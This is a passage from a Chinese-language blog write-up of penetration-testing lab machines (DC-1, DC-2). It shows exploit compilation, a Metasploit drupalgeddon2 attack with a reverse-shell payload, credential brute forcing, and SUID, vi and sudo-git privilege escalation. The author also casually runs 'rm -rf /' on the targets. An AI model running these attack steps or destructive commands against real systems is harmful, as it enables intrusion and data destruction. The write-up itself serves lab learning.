39772.txt   42936.md   46978.sh   788.pl</span><br><span class="line">14830.py   19429.sh   2031.c     21506.c     22863.c    2581.c      3427.php   39810.py    42937.md   46989.sh   791.c</span><br><span class="line">15074.sh   19464.c    20338.c    21507.sh    22884.c    258.sh      3440.php   39811.txt   43006.txt  4698.c     792.c</span><br><span class="line">15150.c    19465.c    20339.sh   21538.c     22928.pl   25947.txt   34421.c    39938.rb    43007.txt  46996.sh   796.sh</span><br><span class="line">15155.c    19467.c    20341.sh   21568.c     22943.c    25993.sh    34537.txt  39967.txt   43029.c    469.sh     816.c</span><br><span class="line">1518.c     19469.c    20378.pl   21583.pl    22965.c    260.c       3479.php   39992.md    43127.c    47009.c    824.c</span><br><span class="line">15274.txt  19470.c    20385.sh   21584.pl    22971.txt  26100.sh    3480.php   3.c         43331.txt  47017.rb   8303.c</span><br><span class="line">15285.c    19474.txt  203.sh     21585.c     22979.txt  26195.txt   34923.c    40003.c     43345.c    47072.rb   8369.sh</span><br><span class="line">152.c      19485.c    20402.sh   215.c       22984.c    26218.txt   34987.c    40023.py    43359.c    470.c      8470.py</span><br><span class="line">15304.txt  19499.c    20411.c    21623.txt   22985.c    26321.c     3499.php   40025.py    43418.c    47133.txt  8478.sh</span><br><span class="line">15344.c    19500.c    20458.txt  21624.py    22993.txt  26353.txt   35021.rb   40054.c     43449.rb   47147.txt  8534.c</span><br><span class="line">15481.c    19501.c    20493.sh   21666.txt   22996.c    26451.rb    35112.sh   40169.txt   434.sh     47149.txt  8572.c</span><br><span class="line">154.c      19508.sh   20517.c    21667.c     229.c      26492.txt   35161.c    40203.py    43775.c    47163.c    8673.c</span><br><span class="line">15620.sh   19510.pl   20554.sh   21674.c     23045.pl   26498.txt   35234.py   40270.txt   438.sh     47164.sh   8678.c</span><br><span class="line">15704.c    19511.c    20555.sh   21683.c     23077.pl   27056.pl    3525.php   4028.txt    43935.txt  47165.sh   876.c</span><br><span class="line">15745.txt  19512.sh   20556.c    216.c       23119.c    27057.py    3529.php   40360.py    43971.rb   47166.sh   877.pl</span><br><span class="line">15774.c    19517.pl   20581.c    21700.c     23126.c    27065.txt   35370.c    40392.py    43979.py   47167.sh   890.pl</span><br><span class="line">1579.pl    19523.txt  205.pl     21701.pl    23168.pl   27066.txt   35450.txt  40394.rb    44023.rb   47168.c    895.c</span><br><span class="line">1591.py    19544.c    20604.sh   21732.txt   23189.c    27231.txt   35595.txt  40450.txt   44024.rb   47169.c    9135.sh</span><br><span class="line">15944.c    19565.sh   20626.c    21733.sh    23197.c    27297.c     35681.txt  40465.txt   44025.rb   47231.py   913.pl</span><br><span class="line">1596.txt   19602.c    20645.c    21761.c     231.sh     273.c       3571.php   40488.txt   44049.md   47307.rb   914.c</span><br><span class="line">16086.txt  19655.txt  20691.txt  21762.c     23204.c    27461.c     3572.php   40489.txt   44064.md   47344.rb   9191.txt</span><br><span class="line">160.c      19676.c    206.c      21763.txt   23223.c    27766.txt   35746.sh   40503.rb    44097.rb   47345.rb   91.c</span><br><span class="line">17083.pl   19677.c    20720.c    21793.txt   23228.c    27769.txt   35748.txt  405.c       44204.md   47421.rb   9207.sh</span><br><span class="line">17147.txt  19693.txt  20721.c    217.c       23251.txt  27938.rb    35749.txt  40611.c     44205.md   47466.c    9208.txt</span><br><span class="line">17391.c    19698.txt  20776.c    21814.c     23258.c    28287.c     3587.c     40616.c     44246.txt  47482.rb   924.c</span><br><span class="line">17611.pl   19699.txt  20777.c    21848.rb    23297.c    28288.c     3595.c     40634.py    44279.py   47502.py   926.c</span><br><span class="line">17787.c    19700.c    20778.sh   21865.c     23299.c    28332.rb    36229.py   40678.c     44298.c    47507.py   9302.py</span><br><span class="line">178.c      19709.sh   20781.txt  21871.c     23300.c    28405.txt   36257.txt  40679.sh    44303.c    47543.rb   9352.c</span><br><span class="line">17932.c    19710.c    20795.sh   21872.c     23301.c    285.c       36294.c    40688.rb    44325.c    4756.c     9363.c</span><br><span class="line">17942.c    19723.txt  20798.sh   218.c       23303.c    28657.c     36430.sh   40759.rb    44331.py   47580.rb   93.c</span><br><span class="line">18040.c    19727.c    20822.sh   2193.php    23308.c    28680.txt   36564.txt  40768.sh    44426.py   47687.py   9435.txt</span><br><span class="line">18064.sh   19735.txt  20823.sh   21980.c     23344.txt  28806.txt   36571.sh   40774.sh    44452.py   476.c      9436.txt</span><br><span class="line">18071.sh   19762.c    20843.txt  219.c       23345.txt  290.tcsh    36746.c    40788.txt   44523.rb   47703.txt  9479.c</span><br><span class="line">18072.sh   19763.txt  20867.txt  21.c        23346.txt  29446.c     36747.c    40789.txt   44601.txt  47726.sh   950.c</span><br><span class="line">18080.c    19764.txt  20868.txt  22002.txt   23350.c    29467.c     36782.sh   40810.c     44633.rb   47779.txt  9513.c</span><br><span class="line">18086.c    19765.txt  20897.sh   22014.c     23351.c    29714.txt   36820.txt  40812.c     44652.py   47804.rb   9521.c</span><br><span class="line">180.c      19778.c    20898.sh   22055.txt   23352.c    29746.txt   36855.py   40838.c     44654.rb   47957.rb   9543.c</span><br><span class="line">18105.sh   19779.c    20900.txt  22066.c     23364.sh   29822.c     36887.py   40839.c     44677.rb   47999.txt  9545.c</span><br><span class="line">18147.c    19787.txt  20901.c    22128.c     2338.c     29954.txt   36966.txt  40847.cpp   44688.txt  479.c      9574.txt</span><br><span class="line">18228.sh   19794.txt  20926.txt  22189.txt   23414.txt  30093.txt   369.pl     40921.sh    44696.rb   48000.sh   9575.c</span><br><span class="line">182.sh     19802.c    20927.c    22190.txt   23479.sh   30280.txt   37088.c    40936.html  44797.txt  48052.sh   9595.c</span><br><span class="line">1831.txt   19803.txt  20928.sh   221.c       23481.c    30464.c     37089.txt  40937.txt   44798.txt  48131.rb   9598.txt</span><br><span class="line">183.c      19804.pl   20967.c    22212.txt   23482.c    30503.txt   37167.c    40938.py    44806.txt  48185.rb   9608.c</span><br><span class="line">18411.c    19811.c    20979.c    22233.c     23510.c    30604.c     37168.txt  40943.txt   44842.txt  48803.py   9627.txt</span><br><span class="line">184.pl     19812.c    20986.c    22234.c     23581.pl   30605.c     37183.c    40953.sh    44889.rb   48961.py   9641.txt</span><br><span class="line">186.pl     19813.txt  20988.c    22235.pl    23634.c    30620.txt   37265.txt  40962.txt   44899.txt  48962.py   9709.txt</span><br><span class="line">18733.py   19816.txt  20990.c    22265.pl    23658.c    30780.txt   37292.c    40.pl       44904.py   48963.txt  973.c</span><br><span class="line">18783.txt  19837.c    20992.c    222.c       23674.txt  30839.c     37293.txt  41022.md    44920.txt  49259.c    974.pl</span><br><span class="line">18785.txt  19838.c    209.c      22320.c     23682.c    31151.c     3730.txt   41076.py    45009.txt  49572.txt  9844.py</span><br><span class="line">18917.txt  19867.txt  21010.sh   22321.c     23738.c    31346.c     374.c      41152.txt   45010.c    49765.txt  997.sh</span><br><span class="line">19070.txt  19883.c    21014.c    22322.c     23743.txt  3154.c      37543.c    41154.sh    45058.rb   50011.sh</span><br><span class="line">19071.txt  19900.c    21043.c    22323.c     23759.pl   317.txt     375.c      41158.md    45089.py   50135.c</span><br><span class="line">19072.txt  19915.txt  21060.c    22326.c     23849.txt  31911.txt   37631.c    41171.txt   45130.py   50236.py</span><br><span class="line"><span class="comment"># md，看到一堆漏洞执行脚本。。。吓死老子了</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">──(root㉿kali)-[/usr/…/exploitdb/exploits/linux/local]</span><br><span class="line">└─<span class="comment"># cp 45010.c /root                            </span></span><br><span class="line">                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[/usr/…/exploitdb/exploits/linux/local]</span><br><span class="line">└─<span class="comment"># cd ~                                        </span></span><br><span class="line">                                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">45010.c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译完成之后可以上传靶机，执行就能获取靶机的最高权限</span></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment">#  gcc 45010.c -o 45010</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们把<code>45010</code>提权脚本上传到&#x2F;tmp&#x2F;目录下</p>
<p>&#x2F;tmp目录是任何用户都有读写权限的，这样上传就不会有出错</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801210945414.png" alt="image-20220801210945414"></p>
<p>我们再次进入shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 73349 created.</span><br><span class="line">Channel 2 created.</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 80</span><br><span class="line">drwxrwxrwt 13 root     root      4096 Aug  1 06:12 .</span><br><span class="line">drwxr-xr-x 24 root     root      4096 Aug  1 04:51 ..</span><br><span class="line">drwxrwxrwt  2 root     root      4096 Aug  1 05:58 .ICE-unix</span><br><span class="line">drwxrwxrwt  2 root     root      4096 Aug  1 03:42 .Test-unix</span><br><span class="line">-r--r--r--  1 root     root        11 Aug  1 05:58 .X0-lock</span><br><span class="line">drwxrwxrwt  2 root     root      4096 Aug  1 05:58 .X11-unix</span><br><span class="line">drwxrwxrwt  2 root     root      4096 Aug  1 03:42 .XIM-unix</span><br><span class="line">drwxrwxrwt  2 root     root      4096 Aug  1 03:42 .font-unix</span><br><span class="line">-rw-r--r--  1 www-data www-data 21784 Aug  1 06:09 45010</span><br><span class="line">drwxrwxrwt  2 root     root      4096 Aug  1 03:42 VMwareDnD</span><br><span class="line">drwx------  3 root     root      4096 Aug  1 03:42 systemd-private-2066467e9de14ff390b770637de1e2d3-colord.service-h9nmfx</span><br><span class="line">drwx------  3 root     root      4096 Aug  1 05:13 systemd-private-2066467e9de14ff390b770637de1e2d3-fwupd.service-XmNTS9</span><br><span class="line">drwx------  3 root     root      4096 Aug  1 03:42 systemd-private-2066467e9de14ff390b770637de1e2d3-rtkit-daemon.service-Y4buax</span><br><span class="line">drwx------  3 root     root      4096 Aug  1 04:36 systemd-private-2066467e9de14ff390b770637de1e2d3-systemd-timesyncd.service-MbYS6D</span><br><span class="line">drwx------  2 root     root      4096 Aug  1 03:42 vmware-root</span><br><span class="line"><span class="built_in">chmod</span> +x 45010</span><br><span class="line"><span class="comment"># 接下来我们见证奇迹</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">www-data</span><br><span class="line">./45010</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># 我们获取了最高权限</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801211358000.png" alt="image-20220801211358000"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 渗透结束</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">enc</span><br><span class="line">enc.cpp</span><br><span class="line">enc.txt</span><br><span class="line">key.txt</span><br><span class="line">root.txt</span><br><span class="line">sql.py</span><br><span class="line">t.sh</span><br><span class="line">wfuzz</span><br><span class="line">wordpress.sql</span><br><span class="line"><span class="built_in">cat</span> root.txt</span><br><span class="line">b2b17036da1de94cfb024540a8e7075a</span><br><span class="line"><span class="built_in">cat</span> key.txt</span><br><span class="line">I know you are the fan of ippsec.</span><br><span class="line"></span><br><span class="line">So convert string <span class="string">&quot;ippsec&quot;</span> into md5 <span class="built_in">hash</span> and use it to gain yourself <span class="keyword">in</span> your real form.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们可以修改root密码</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801211851634.png" alt="image-20220801211851634"></p>
<p>也可以<code>清清垃圾</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf /*</span><br></pre></td></tr></table></figure>



<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801211940704.png" alt="image-20220801211940704"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801212036945.png" alt="image-20220801212036945"></p>
<h3 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h3><p>开启DC1，我们先用kali进行一次arp的内网扫描</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arp-scan 192.168.10.0/24 </span><br></pre></td></tr></table></figure>

<p>发现一个可疑ip</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829092126041.png" alt="image-20220829092126041"></p>
<p>我们进行更加精确的二次扫描，这次我们使用nmap来探测其开放的端口和服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -T4 -O 192.168.10.130</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829092339661.png" alt="image-20220829092339661"></p>
<p>我们可以看到目标靶机开放了80端口的web服务，那么我们在浏览器看看这是什么网站</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829092650334.png" alt="image-20220829092650334"></p>
<p>额。。。出现一个很陌生端web端，我们扫描一下这个网站的目录，这需要用dirb</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.10.130/</span><br></pre></td></tr></table></figure>

<p>没什么有用的信息，我们直接查查Drupal这个是什么东西</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829093758910.png" alt="image-20220829093758910"></p>
<p>这是一个开源端cms网站架构，我们去msfconsole查一下它漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829093927409.png" alt="image-20220829093927409"></p>
<p>使用search drupal命令查询cms的漏洞模块</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search drupal</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829094445162.png" alt="image-20220829094445162"></p>
<p>我们使用exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2漏洞模块</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829095305754.png" alt="image-20220829095305754"></p>
<p>然后设置载荷为payload php&#x2F;meterpreter&#x2F;reverse_tcp</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>

<p>然后设定靶机IP为192.168.10.130，kali端ip为192.168.10.129</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> rhosts 192.168.10.130</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.10.129</span><br></pre></td></tr></table></figure>

<p>执行run，开始渗透</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829095547587.png" alt="image-20220829095547587"></p>
<p>已经获取靶机web权限</p>
<p>可以用python达到一个交互效果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829114239396.png" alt="image-20220829114239396"></p>
<p>拿到第一个flag</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829114352171.png" alt="image-20220829114352171"></p>
<p>根据第一个flag，找到Drupal的默认配置文件为 &#x2F;var&#x2F;www&#x2F;sites&#x2F;default&#x2F;settings.php</p>
<p>找到flag2</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829114941459.png" alt="image-20220829114941459"></p>
<p>登陆数据库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ mysql -u dbuser -p</span><br><span class="line">mysql -u dbuser -p</span><br><span class="line">Enter password: R0ck3t</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829115448578.png" alt="image-20220829115448578"></p>
<p>列出数据库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829115610590.png" alt="image-20220829115610590"></p>
<p>选中数据库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use drupaldb</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829115738144.png" alt="image-20220829115738144"></p>
<p>列出数据库表</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show tables;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829115810525.png" alt="image-20220829115810525"></p>
<p>选择users表查看用户信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select * from <span class="built_in">users</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829115912590.png" alt="image-20220829115912590"></p>
<p>回到&#x2F;var&#x2F;www路径下，运行这个password-hash.sh加密脚本，得到新密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php scripts/password-hash.sh orange</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829231852747.png" alt="image-20220829231852747"></p>
<p>我们将得到的hash在mysql中利用update语句更改密码为我刚刚生成的hash密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u dbuser -pR0ck3t</span><br><span class="line"></span><br><span class="line">show databases;</span><br><span class="line"></span><br><span class="line">use drupaldb</span><br><span class="line"></span><br><span class="line">update <span class="built_in">users</span> <span class="built_in">set</span> pass=<span class="string">&#x27;$S$DpCZByiTri9QH0oeoGEVtOgeLBcivMej1zI3GZ16KIzNikITspQj&#x27;</span> <span class="built_in">where</span> uid=1;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829232710615.png" alt="image-20220829232710615"></p>
<p>我们通过</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select * from <span class="built_in">users</span>; </span><br></pre></td></tr></table></figure>

<p>知道已经更改admin密码为orange的hash密码</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829232832099.png" alt="image-20220829232832099"></p>
<p>我们回到web页面</p>
<blockquote>
<p> 输入账号:admin</p>
</blockquote>
<blockquote>
<p> 输入密码:orange</p>
</blockquote>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829233259920.png" alt="image-20220829233259920"></p>
<p>已经登陆，芜湖起飞</p>
<p>flag3在如图</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829233421218.png" alt="image-20220829233421218"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829233449346.png" alt="image-20220829233449346"></p>
<p>我们在flag3获得了这句话</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Special PERMS will <span class="built_in">help</span> FIND the passwd - but you<span class="string">&#x27;ll need to -exec that command to work out how to get what&#x27;</span>s <span class="keyword">in</span> the shadow.</span><br><span class="line"><span class="comment"># 特殊的perm将有助于查找passwd，但您需要-exec该命令来确定如何获取阴影中的内容。</span></span><br></pre></td></tr></table></figure>

<p>也就是说我需要找一下关于passwd的东西，先看看&#x2F;etc&#x2F;passwd</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829234740943.png" alt="image-20220829234740943"></p>
<p>flag4地址可能在&#x2F;home&#x2F;flag4</p>
<p>我们进去看看</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829234844048.png" alt="image-20220829234844048"></p>
<p>找到地方了，但是没有权限，得先提权。。。</p>
<p>先查找提权的软件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -4000</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829235024805.png" alt="image-20220829235024805"></p>
<p>原来find也有提权能力，我们用find命令包含的-exec参数进行提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /var/www -<span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span> \;</span><br></pre></td></tr></table></figure>

<p>这个命令中的&#x2F;bin&#x2F;sh是linux内核和用户之间的命令解释器，可以将我们的命令解释并发送给linux内核。</p>
<p>提权后发现我们的权限已经升级为root了</p>
<p>我们回头看看&#x2F;home&#x2F;flag4里的文件</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829235307752.png" alt="image-20220829235307752"></p>
<p>额，flag4在root目录</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829235354767.png" alt="image-20220829235354767"></p>
<p>flag4到手。。。</p>
<p>靶机也该完成自己的使命了</p>
<p>我记得我是root权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf /</span><br></pre></td></tr></table></figure>

<h3 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h3><p>arp扫描一下找到目标ip为<code>192.168.10.130</code></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220905103729449.png" alt="image-20220905103729449"></p>
<p>老规矩，先用nmap扫描一下目标主机，检测其开放端口和开放服务</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912191533408.png" alt="image-20220912191533408"></p>
<p>我们访问一下目标的80端口</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220905111803400.png" alt="image-20220905111803400"></p>
<p>这里直接跳转了<code>http://dc-2/</code>,而我们本地hosts文件没有这个域名，所以直接报错了，现在我们得配置一下hosts文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220905112028066.png" alt="image-20220905112028066"></p>
<p>然后我们回到浏览器刷新，可以看出这是一个wordpress博客cms</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220905112120177.png" alt="image-20220905112120177"></p>
<p>我们可以看到首页最右边有个flag的菜单栏</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912181533565.png" alt="image-20220912181533565"></p>
<p>这里说要用cewl来生成一个密码字典</p>
<p>所以我们用到下面的工具</p>
<p>kali密码攻击工具——Cewl</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl -w dc2_password.txt http://dc-2/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912182123790.png" alt="image-20220912182123790"></p>
<p>然后我们采用WPScanKali Linux默认自带的一款漏洞扫描工具来手机目标博客信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url dc-2 -e u</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912184150165.png" alt="image-20220912184150165"></p>
<p>枚举到三个账号名，写入到dc2_user.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> <span class="built_in">cat</span> &gt;&gt; dc2_user.txt &lt;&lt; <span class="string">EOF </span></span><br><span class="line"><span class="string">heredoc&gt; admin                   </span></span><br><span class="line"><span class="string">heredoc&gt; jerry</span></span><br><span class="line"><span class="string">heredoc&gt; tom               </span></span><br><span class="line"><span class="string">heredoc&gt; EOF</span></span><br></pre></td></tr></table></figure>

<p>爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url dc-2 -U dc2_user.txt -P dc2_password.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[SUCCESS] - jerry / adipiscing                                                                                                                                                                                                                   </span><br><span class="line">[SUCCESS] - tom / parturient  </span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912185616538.png" alt="image-20220912185616538"></p>
<p>我们扫描一下博客的后台地址</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912190519634.png" alt="image-20220912190519634"></p>
<p>登录进入wordpress</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912191038713.png" alt="image-20220912191038713"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912191122865.png" alt="image-20220912191122865"></p>
<p>拿到flag2，也提示了我们不能直接通过cms漏洞拿到shell了，让我们找另一种方法</p>
<p>最后还是tom登录上了ssh</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912191801459.png" alt="image-20220912191801459"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912192619233.png" alt="image-20220912192619233"></p>
<p>权限巨低</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="comment">#查看上面得到path路径的所有文件</span></span><br><span class="line"><span class="comment">#运行结果 /home/tom/usr/bin</span></span><br><span class="line"><span class="built_in">echo</span> /home/tom/usr/bin/*</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912204229177.png" alt="image-20220912204229177"></p>
<p>使用vi进行提权</p>
<p>先进入vi编辑器界面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi</span><br></pre></td></tr></table></figure>

<p>然后按Esc键，输入</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line">:set shell=<span class="regexp">/bin/</span>bash</span><br></pre></td></tr></table></figure>

<p>设置好shell并回车，接着输入 </p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">:shell</span></span><br></pre></td></tr></table></figure>

<p> 回车，启动shell</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912204858088.png" alt="image-20220912204858088"></p>
<p>写入环境</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin/</span><br><span class="line"> </span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/bin/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912204927994.png" alt="image-20220912204927994"></p>
<p>登录jerry</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su jerry</span><br><span class="line">密码：adipiscing</span><br></pre></td></tr></table></figure>

<p>直接查找flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name *flag*</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912205252880.png" alt="image-20220912205252880"></p>
<p>找到flag4</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912205413784.png" alt="image-20220912205413784"></p>
<p>看看能不能SUID提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912205743401.png" alt="image-20220912205743401"></p>
<p>看一下能用root权限的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912210153663.png" alt="image-20220912210153663"></p>
<p>发现只有git。。。好吧</p>
<p>发现git能使用root的权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo git <span class="built_in">help</span> config</span><br></pre></td></tr></table></figure>

<p>回车然后输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">!/bin/bash  (这里bash也可以换成sh)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912210719620.png" alt="image-20220912210719620"></p>
